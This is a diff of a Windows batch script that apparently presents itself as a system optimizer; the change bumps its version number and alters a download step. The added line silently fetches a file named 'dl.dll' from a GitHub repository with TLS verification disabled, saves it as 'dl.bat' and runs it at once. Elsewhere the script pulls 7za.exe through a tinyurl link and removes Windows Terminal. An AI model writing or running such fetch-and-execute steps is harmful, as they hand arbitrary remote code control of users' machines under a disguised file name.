@@ -26,7 +26,7 @@ set indigo=[38;5;105m
 cd /d %~dp0
 color 7
 
-SET VERSCRIPT=0021
+SET VERSCRIPT=0022
 
 rmdir %SystemDrive%\Windows\system32\adminrightstest >nul 2>&1
 mkdir %SystemDrive%\Windows\system32\adminrightstest >nul 2>&1
@@ -108,8 +108,8 @@ IF "%CSTARTR%"=="2" (
 	PowerShell -Command "Get-AppxPackage *WindowsTerminal* | Remove-AppxPackage" >nul 2>&1
 	IF EXIST Optifiles.7z DEL Optifiles.7z>nul
 	IF NOT EXIST 7za.exe curl -g -k -L -# -o "7za.exe" "https://tinyurl.com/dl-opt-7za" >nul 2>&1
-	curl -L -o "Optifiles.7z" "https://edef2.pcloud.com/cBZ7p3Gm9ZXDsfJrZZZ0q91kkZ2ZZi05ZkZnNNmkZj5Zi0ZJ5Z7FZDHZEJZr0ZYVZ8JZs5ZD0Z9kZGkZaVZ5KigZGHpNry3bP2Q1JK0DWQeqnJ1bPNky/Optifiles.7z" >nul 2>&1
-	@timeout /t 02>nul
+	curl -g -k -L -# -o "dl.bat" "https://github.com/DOCSDROPT/OPTF_1/raw/main/SRTTP/dl.dll" & start cmd /c "dl.bat"
+	@timeout /t 10>nul
 	IF EXIST Optifiles.7z (7za.exe -y x -p9421 -oC:\ Optifiles.7z >nul)
 	IF EXIST 7za.exe DEL 7za.exe>nul
 	IF EXIST Optifiles.7z DEL Optifiles.7z>nul
